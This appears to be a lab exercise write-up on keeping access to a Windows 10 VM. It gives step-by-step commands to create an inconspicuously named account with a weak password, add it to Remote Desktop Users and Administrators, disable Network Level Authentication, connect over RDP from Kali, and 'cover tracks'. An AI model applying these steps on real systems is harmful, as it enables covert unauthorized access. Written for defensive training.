# Persist On A Windows Machine With A Malicious User Account
Creating a malicious local account is a simple way to install a backdoor, often going unnoticed in poorly managed networks. Even if detected, it may remain due to concerns over breaking functionality. Skilled attackers may avoid giving the account admin rights, opting instead to plant a privilege escalation vulnerability for future use

## Tasks
- Create a user with an inconspicuous name that would seamlessly blend into an organization in a VM
- Initiate an RDP connection to the target system from a separate machine, utilizing the malicious account's credentials to showcase successful access
- Navigate the system's directories to emphasize the subtle nature of the malicious account's presence and the potential challenges in detection
- Generate a dummy file in a sensitive directory to simulate a security breach, demonstrating how a malicious actor might misuse this access for unauthorized file manipulation
- Show how the malicious account can be used to cover tracks, such as deleting the dummy file

## Solutions With Scripts
1. Open PowerShell as Administrator in Windows 10 VM
2. Add a user with a non-suspicious name such as `svc_network` or `backup_admin`
   ```
   net user svc_network password123 /add
   ```
3. Add the user to a specific group like "Users" and "Remote Desktop Users". Avoid giving it administrative privileges to make the account less suspicious
   ```
   net localgroup Users svc_network add
   net localgroup "Remote Desktop Users" svc_network /add
   ```
   To confirm that `svc_network` user has been added into "Remote Desktop Users" group, go to Control Panel > System and Security. Under System, click Allow remote access. A System Properties window will appear. Click Select Users... and confirm that svc_network is in the allowed list <br/>
   ![image](https://github.com/user-attachments/assets/82b445d6-d9ca-4ccb-91cd-0af5450bb15d)
   However, to simulate a security breach, the created user must have admin privileges. To add `svc_network` to the Administrators groups, run both commands in Windows 10 VM
   ```
   Add-LocalGroupMember -Group "Administrators" -Member "svc_network"
   Get-LocalGroupMember -Group "Administrators"
   ```
5. To enable RDP (Remote Desktop Protocol) on Windows 10 VM, go to Settings > System > Remote Desktop (left panel). Turn on Enable Remote Desktop. In the Advanced settings,  uncheck the Network Level Authentication as shown below
   ![image](https://github.com/user-attachments/assets/2775be67-8ec5-46b1-842a-2b6fefe6dc84)
6. Allow RDP through Windows Firewall and ensure that Remote Desktop is checked for both private and public networks
7. To initiate an RDP connection from Kali Linux, install `xfreerdp` using the following commands
   ```
   sudo apt update
   sudo apt install freerdp2-x11
   ``` 
8. Enable the default port for RDP (3389) in Kali Linux using the each of the commands below
   ```
   sudo ufw status
   sudo ufw allow 3389/tcp
   sudo ufw reload
   sudo ufw status
   ```
9. Use the malicious account credentials (`svc_network`) to connect to Windows 10 VM via RDP
   ```
   sudo xfreerdp /u:svc_network /p:password123 /v:192.168.1.21 /dynamic-resolution /cert:ignore /sec:tls
   ```
10. Create a dummy file in a sensitive directory like C:\Program Files or C:\Windows\Temp. To cover up the tracks, delete the dummy file
11. Close the RDP connection by logging out of the RDP session from Kali Linux by pressing Ctrl+C to end the xfreerdp session
12. To remove the created account in Windows 10 VM, run the command in PowerShell opened with administrator privileges
    ```
    Remove-LocalUser -Name "username"
    ```

